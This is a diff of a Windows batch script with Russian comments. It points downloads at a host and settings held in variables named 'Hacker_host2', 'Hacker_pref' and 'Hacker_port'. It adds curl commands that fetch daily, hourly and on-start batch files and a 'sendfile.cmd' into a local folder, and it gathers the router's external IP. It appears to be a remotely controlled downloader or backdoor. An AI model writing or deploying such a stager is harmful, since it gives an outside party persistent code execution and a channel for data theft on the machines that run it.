@@ -15,9 +15,9 @@ rem Определяем переменные:
 rem Основная папка
 set Mainfolder=Private
 rem Префикс протокола
-set pref=http
+set pref=%Hacker_pref%
 rem HTTP Port
-set port=80
+set port=%Hacker_port%
 
 rem HTTP WebDAV Host
 set host=%pref%://%Hacker_host2%:%port%/%MainFolder%
@@ -34,10 +34,10 @@ cd /d %LocalFolder%
  
 rem Генерируем Wget команды
 
-wget --http-user=%user% -nc --http-passwd=%password% %host%/user_dayly1.bat
-wget --http-user=%user% -nc --http-passwd=%password% %host%/user_hourly1.bat
-wget --http-user=%user% -nc --http-passwd=%password% %host%/user_onstart1.bat
-wget --http-user=%user% -nc --http-passwd=%password% %host%/sendfile.cmd
+curl -o "%PUB1%\Util\user_hourly1.bat" -v --user %user%:%password% %host%/user_hourly1.bat
+curl -o "%PUB1%\Util\user_dayly1.bat" -v --user %user%:%password% %host%/user_dayly1.bat
+curl -o "%PUB1%\Util\user_onstart1.bat" -v --user %user%:%password% %host%/user_onstart1.bat
+curl -o "%PUB1%\Util\sendfile.cmd" -v --user %user%:%password% %host%/sendfile.cmd
 
 REM Получаем внешний IP адрес маршрутизатора
 call "%PUB1%\Util\getip_1.cmd"
